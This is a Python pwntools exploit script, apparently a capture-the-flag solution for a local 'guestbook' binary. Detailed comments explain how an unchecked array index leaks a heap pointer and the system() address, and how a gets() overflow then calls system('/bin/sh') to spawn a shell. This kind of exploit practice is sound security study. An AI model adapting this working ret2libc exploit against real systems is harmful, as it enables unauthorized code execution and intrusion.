import struct
import pwn

# guestbook is a 32-bit dynamically linked binary
# NX is enabled, PIE is enabled, ASLR is turned on

# This exploit involves using a bug where the index of an array is not checked to leak a heap address and the address of system()
# Then, we use a buffer overflow to call system() with /bin/sh

# The heap addresses essentially act like stack canaries in this exploit;
# immediately after gets() there is a strcpy to the heap address
# If the heap address has been overwritten by the buffer overflow, we will segfault
# So we need to leak heap addresses, so we can do the overwrite with a real heap addr

# We don't need to rop at all because we are essentially conveniently handed the address of system()

# The binary asks for the names of 4 guests as input
# a buffer of size 15 is malloced for each guest
# then input is scanned into that buffer

# There is a function which allows us to view guest at index n
# There is no check on whether n is a valid index

# There is a function which allows us to change a guest's name
# uses gets() to scan user input into a 100 byte buffer
# then strcpy's that buffer into the malloced buffer


# Looking at the heap locations of our inputs, and the stack locations of their pointers:

# In GDB; name our guests scott110, scott111, scott112, scott113
# search-pattern scott11 will show us the heap addresses where each of the names have been stored:
    # 0x565581a0 - 0x565581a8  →   "scott110" 
    # 0x565581c0 - 0x565581ca  →   "scott113\n" 
    # 0x565585d0 - 0x565585d8  →   "scott111" 
    # 0x565585f0 - 0x565585f8  →   "scott112" 
    # 0x56558610 - 0x56558618  →   "scott113"
# search-pattern 0x565581a0 will then show us the stack address where the pointer to the first name is being stored
    # 0xffffce8c - 0xffffce9c
# x/20w 0xffffce8c will then show us the contents of the stack around where the pointers are being stored:
    # 0xffffce8c:	0x565581a0	0x565585d0	0x565585f0	0x56558610
    # 0xffffce9c:	0xa5559f1	0xf7e04780	0xffffce8c	0x56558610
    # 0xffffceac:	0x1000000	0x4	0x0	0x0
    # 0xffffcebc:	0xf7ddded5	0x1	0xffffcf54	0xffffcf5c
    # 0xffffcecc:	0xffffcee4	0xf7fae000	0x0	0xffffcf38
# You can see the four pointers to the heap, 0xa5559f1 which is not an address,
    # x/w 0xf7e04780 shows that this is an address. x/i 0xf7e04780 shows that this is the start of a system() call
    # x/w 0xffffce8c shows 0xffffce8c:	0x565581a0, so this is a pointer to the heap location of our first name
    # Wait a second! 0xffffce8c is a just a stack location (pay attention!)
    
    # We can leak the heap location
    # We can leak the system() location so we can make a call to system

# If we index to the '6th' element of our guests array, we will print what is pointed to by 0xffffce8c
# this will be a location on the heap

# remember, puts() will continue printing until a null byte is reached. As long as our heap addresses, stored on the stack between 0xffffce8c and 0xffffce9c
# do not contain null bytes, the address of system() will also be printed by this info leak

target = pwn.process('./guestbook')

target.recvuntil(b'>>>')
target.sendline(b'scott11')
target.recvuntil(b'>>>')
target.sendline(b'scott12')
target.recvuntil(b'>>>')
target.sendline(b'scott13')
target.recvuntil(b'>>>')
target.sendline(b'scott14')


################################################
#### Leaking the heap addr and sytem() addr ####
################################################

target.recvuntil(b'>>')
target.sendline(b'1')
target.recvuntil(b'>>>')
target.sendline(b'6') # Ask to view the 6th entry

pie_leak = target.recvuntil(b'---------------------------')
pie_leak = pie_leak.strip(b'\n---------------------------')

if len(pie_leak) < 24: # 0-15 are heap pointers, 16-19 is 0xa5559f1, 20 - 23 is system() addr
    print("null byte somewhere: bad luck. Just try running again")
    exit()

heap_addr_leak = struct.unpack("<I", pie_leak[0:4])[0]

print(f"heap addr: {hex(heap_addr_leak)}") # This should always end with 1a0 like it does above

system_addr_leak = struct.unpack("<I", pie_leak[20:24])[0] # list slice is [)

print(f"sys addr: {hex(system_addr_leak)}") # Always ends in 0x780: good sign

########################################
#### Calculating address of /bin/sh ####
########################################

# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
# 18e363 /bin/sh

# objdump -D /lib/i386-linux-gnu/libc.so.6 | grep system
# 00041780 <__libc_system@@GLIBC_PRIVATE>:

libc_base = system_addr_leak - 0x00041780

bin_sh = struct.pack("<I", 0x18e363 + libc_base)

#########################
#### Buffer Overflow ####
#########################

# vuln_buf[100] is stored at Stack[-0x9c] (0x9c = 156)
# user_in_int2 is stored at Stack[-0x38] ( 0x38 = 56) -> This is the int where our index selection is scanned into, so we need to preserve its value as 0
# inputs_arr[4] is stored at Stack[-0x30] (0x30 = 48)


payload = b'name'
payload += struct.pack("<I", 0x0) # strcpy() is going to be performed on this input. This might not be necessary, but is a good idea nonetheless
payload += b'a' * 92 # 100 bytes total to user_in_int2
payload += struct.pack("<I", 0x0) # preserve our index selection
payload += b'b' * 4 # 4 more bytes (an int) to heap addr arr
payload += struct.pack("<I", heap_addr_leak)
payload += b'c' * 44 # 44 more bytes to the base of the stack
payload += struct.pack("<I", system_addr_leak)
payload += b'd' * 4 # stack is 8-byte aligned for 32-bit x86
payload += bin_sh # 32-bit land so system() will use top of stack as its argument

target.recvuntil(b'>>')
target.sendline(b'2')
target.recvuntil(b'>>>')
target.sendline(b'0') # We want to change the first name (doesn't actually matter what we put, we overwrite it as well)
target.recvuntil(b'>>>')
target.sendline(payload)

target.sendline(b'a') # Because of the binary gets input you just gotta send it one more newline before it will give you a new prompt
target.recvuntil(b'>>')
target.sendline(b'3') # Quit

target.interactive()